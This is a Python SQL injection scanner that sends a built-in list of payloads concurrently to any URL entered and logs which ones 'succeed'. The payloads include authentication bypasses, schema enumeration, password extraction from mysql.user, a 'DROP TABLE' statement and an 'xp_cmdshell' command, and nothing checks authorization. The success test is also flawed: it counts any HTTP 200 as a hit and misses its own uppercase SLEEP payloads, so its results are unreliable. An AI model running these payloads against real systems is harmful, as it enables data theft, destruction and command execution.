##ULTIMATE PYTHON SQL injection testing




import requests
import time
import json
import re
import logging
from concurrent.futures import ThreadPoolExecutor

# Set up logging
logging.basicConfig(filename='sql_injection_test.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define payloads for various SQL injection tests
# Consider adding more payloads to address the evolving nature of SQL injection attacks.
payloads = [
    {"desc": "Number of columns - MySQL/MSSQL/PGSQL", "payload": "' UNION SELECT NULL,NULL,NULL -- -"},
    {"desc": "Number of columns - Oracle", "payload": "' UNION SELECT NULL,NULL,NULL FROM DUAL -- -"},
    {"desc": "Number of columns - UNION ORDER BY", "payload": "' UNION ORDER BY 1 -- -"},
    {"desc": "Database enumeration - MySQL/MSSQL", "payload": "' UNION SELECT @@version -- -"},
    {"desc": "Database enumeration - Oracle", "payload": "' UNION SELECT banner from v$version -- -"},
    {"desc": "Database enumeration - Oracle (2nd method)", "payload": "' UNION SELECT version from v$instance -- -"},
    {"desc": "Database enumeration - Postgres", "payload": "' UNION SELECT version() -- -"},
    {"desc": "Table name enumeration - MySQL/MSSQL/Postgres", "payload": "' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -"},
    {"desc": "Table name enumeration - Oracle", "payload": "' UNION SELECT table_name,NULL FROM all_tables -- -"},
    {"desc": "Column name enumeration - MySQL/MSSQL/Postgres", "payload": "' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name='X' -- -"},
    {"desc": "Column name enumeration - Oracle", "payload": "' UNION SELECT column_name,NULL FROM all_tab_columns where table_name='X' -- -"},
    {"desc": "Column values concatenation - MySQL/Postgres", "payload": "' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -"},
    {"desc": "Conditional (Error Based) - MySQL", "payload": "' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -"},
    {"desc": "Time-Based - MySQL", "payload": "' OR (SELECT IF(1=1, SLEEP(10), 0)) -- -"},
    {"desc": "Time-Based - MSSQL", "payload": "';WAITFOR DELAY '0:0:30'--"},
    {"desc": "Time-Based - Postgres", "payload": "';SELECT pg_sleep(10)--"},
    {"desc": "Generic Error Based Payload - MySQL", "payload": "' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -"},
    {"desc": "Authentication Bypass - or true", "payload": "or true--"},
    {"desc": "Authentication Bypass - admin') or ('1'='1'", "payload": "admin') or ('1'='1'--"},
    {"desc": "Order by - MySQL/MSSQL", "payload": "1' ORDER BY 1--+"},
    {"desc": "Group by - MySQL/MSSQL", "payload": "1' GROUP BY 1,2--+"},
    {"desc": "Union select - MySQL/MSSQL", "payload": "-1' UNION SELECT 1,2,3--+"},
    {"desc": "Second-Order Injection - MySQL", "payload": "'; DROP TABLE test -- "},
    {"desc": "Extract user table - MySQL", "payload": "' UNION SELECT user, password FROM mysql.user -- -"},
    {"desc": "Extract version from Postgres", "payload": "'; SELECT version(); --"},
    {"desc": "Extract table names from sqlite_master", "payload": "' UNION SELECT name FROM sqlite_master WHERE type='table' -- -"},
    {"desc": "Error-Based - MySQL", "payload": "' AND 1=CONVERT(int, (SELECT @@version)) -- -"},
    {"desc": "Error-Based - MSSQL", "payload": "' AND 1=CONVERT(int, (SELECT @@version)) -- -"},
    {"desc": "Blind SQL Injection - MySQL", "payload": "' OR IF(1=1, SLEEP(5), 0) -- -"},
    {"desc": "Blind SQL Injection - MSSQL", "payload": "' OR IF(1=1, WAITFOR DELAY '0:0:05', 0) -- -"},
    {"desc": "Stacked Queries - MSSQL", "payload": "'; EXEC xp_cmdshell('dir') -- -"},
    {"desc": "MySQL Authentication Bypass - 1=1", "payload": "admin' OR '1'='1' -- -"},
    {"desc": "PostgreSQL Authentication Bypass - 1=1", "payload": "admin' OR '1'='1' -- -"},
]

def is_valid_url(url):
    """Validate the URL format using regex."""
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # IPv4...
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # IPv6...
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def test_payload(session, url, payload):
    """Sends the payload to the target URL and checks if it's vulnerable."""
    try:
        # Record start time for time-based payloads
        is_time_based = "sleep(" in payload or "WAITFOR" in payload
        start_time = time.time() if is_time_based else None
        
        # Make request
        response = session.get(f"{url}{payload}", timeout=10)
        
        # Log response status
        logging.info(f"Response status code: {response.status_code}")

        # Advanced analysis
        error_keywords = ["sql", "error", "syntax error", "unclosed quotation mark"]
        error_detected = any(keyword in response.text.lower() for keyword in error_keywords)
        
        success_keywords = ["version", "table", "database"]
        success_detected = any(keyword in response.text.lower() for keyword in success_keywords)
        
        # Check response time for time-based injections
        if is_time_based:
            response_time = time.time() - start_time
            time_based_success = response_time > 8  # This can be configurable
            logging.info(f"Response time for time-based payload: {response_time:.2f} seconds")
        else:
            time_based_success = False

        # Determine if vulnerable based on advanced analysis
        if not error_detected and (response.status_code == 200 or success_detected or time_based_success):
            logging.info(f"Payload successful: {payload}")
            return "success"
        else:
            logging.info(f"Payload failed: {payload}")
            return "failed"
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed with error: {e}")
        return "failed"
    except Exception as e:
        logging.error(f"Unexpected error occurred: {e}")
        return "failed"

def execute_payloads(session, url):
    """Execute all payloads and log results."""
    results = []
    with ThreadPoolExecutor(max_workers=5) as executor:  # Configurable thread pool size
        future_to_payload = {executor.submit(test_payload, session, url, item["payload"]): item for item in payloads}
        for future in future_to_payload:
            item = future_to_payload[future]
            try:
                result = future.result()
                results.append((item['desc'], result))
                logging.info(f"{item['desc']}: {result}")
            except Exception as exc:
                logging.error(f"{item['desc']} generated an exception: {exc}")
                results.append((item['desc'], "error"))

    return results

def main():
    target_url = input("Enter the target URL (e.g., https://example.com/vulnerable_endpoint): ").strip()
    
    if not is_valid_url(target_url):
        print("Invalid URL format. Please enter a valid URL.")
        logging.error("Invalid URL format entered.")
        return
    
    session = requests.Session()  # Create a session for persistence
    output_filename = "output.txt"

    # Execute payloads and collect results
    results = execute_payloads(session, target_url)

    # Open output file to log results
    with open(output_filename, "w") as file:
        for desc, result in results:
            file.write(f"{desc}: {result}\n")
            print(f"{desc}: {result}")

    print(f"\nResults logged in '{output_filename}'.")

    # Save configurations and results for further analysis
    config = {
        "target_url": target_url,
        "payloads_executed": len(payloads),
        "results": results
    }
    
    with open("config_results.json", "w") as json_file:
        json.dump(config, json_file, indent=4)

if __name__ == "__main__":
    main()